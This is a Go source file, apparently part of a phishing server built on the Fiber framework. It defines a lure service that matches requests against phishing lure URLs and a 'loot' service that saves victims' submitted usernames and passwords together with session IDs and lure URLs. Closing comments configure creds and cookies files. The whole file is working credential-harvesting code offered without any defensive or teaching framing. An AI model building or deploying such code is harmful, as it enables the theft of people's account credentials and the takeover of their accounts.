package main

import (
	"time"

	"github.com/gofiber/fiber/v2"
)

type LureService interface {
	ExistsByURL(url string) (bool, error)
}

func NewStaticLureService(lureURLs []string) LureService {
	luresMap := make(map[string]struct{})
	for _, lure := range lureURLs {
		luresMap[lure] = struct{}{}
	}
	return &staticLureService{luresMap}
}

type staticLureService struct {
	lures map[string]struct{}
}

func (s *staticLureService) ExistsByURL(url string) (bool, error) {
	_, exists := s.lures[url]
	return exists, nil
}

type APILoginInfo struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type LootService interface {
	SaveCreds(c *fiber.Ctx, info *APILoginInfo) error
}

func NewLootService(repo LootRepository) LootService {
	return &lootService{repo}
}

type lootService struct {
	repo LootRepository
}

func (s *lootService) SaveCreds(c *fiber.Ctx, info *APILoginInfo) error {
	sess := getSession(c)
	lureURL := sess.Get("lureURL").(string)
	dbInfo := &DBLoginInfo{
		Username:  info.Username,
		Password:  info.Password,
		Date:      time.Now().UTC(),
		SessionID: sess.ID(),
		LureURL:   lureURL,
	}
	return s.repo.SaveCreds(dbInfo)
}

// DB_TYPE = file / redis
// DB_URL =
// CREDS_FILE = creds.jsonl
// COOKIES_FILE = cookies.jsonl
